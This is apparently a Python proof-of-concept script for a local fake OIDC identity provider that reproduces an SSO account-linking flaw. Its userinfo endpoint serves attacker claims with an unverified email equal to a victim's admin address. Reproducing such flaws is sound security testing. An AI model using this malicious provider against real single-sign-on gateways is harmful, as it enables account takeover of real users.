"""Scratch fake OIDC IdP for the SSO account-linking repro. Never commit
credentials; everything here is local, throwaway, and keyed to scratch values.

Endpoints:
  GET /authorize  -> preserves state, 302 to the gateway /sso/callback with code=repro-code
  POST /token     -> fixed token JSON
  GET|POST /userinfo -> attacker claims: unverified email equal to the victim's email
"""
import json
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer

CALLBACK_BASE = "http://127.0.0.1:4100/sso/callback"
ATTACK_EMAIL = "admin@corpdemohunt.com"
ATTACKER_SUBJECT = "attacker-unverified-sub"


def claims() -> dict:
    return {
        "sub": ATTACKER_SUBJECT,
        "preferred_username": ATTACKER_SUBJECT,
        "email": ATTACK_EMAIL,
        "email_verified": False,
        "name": "Attacker Account",
    }


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *args):
        pass

    def _send(self, status: int, body: bytes, headers=None) -> None:
        self.send_response(status)
        for k, v in (headers or {}).items():
            self.send_header(k, v)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        qs = urllib.parse.parse_qs(parsed.query)
        if parsed.path == "/authorize":
            state = (qs.get("state") or [""])[0]
            back = f"{CALLBACK_BASE}?code=repro-code&state={urllib.parse.quote(state)}"
            self._send(302, b"", {"Location": back})
        elif parsed.path == "/userinfo":
            body = json.dumps(claims()).encode()
            self._send(200, body, {"Content-Type": "application/json"})
        else:
            self._send(404, b"not found")

    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path == "/token":
            body = json.dumps(
                {"access_token": "scratch-access-token", "id_token": "scratch-id-token", "token_type": "Bearer"}
            ).encode()
            self._send(200, body, {"Content-Type": "application/json"})
        elif parsed.path == "/userinfo":
            body = json.dumps(claims()).encode()
            self._send(200, body, {"Content-Type": "application/json"})
        else:
            self._send(404, b"not found")


if __name__ == "__main__":
    HTTPServer(("127.0.0.1", 9600), Handler).serve_forever()
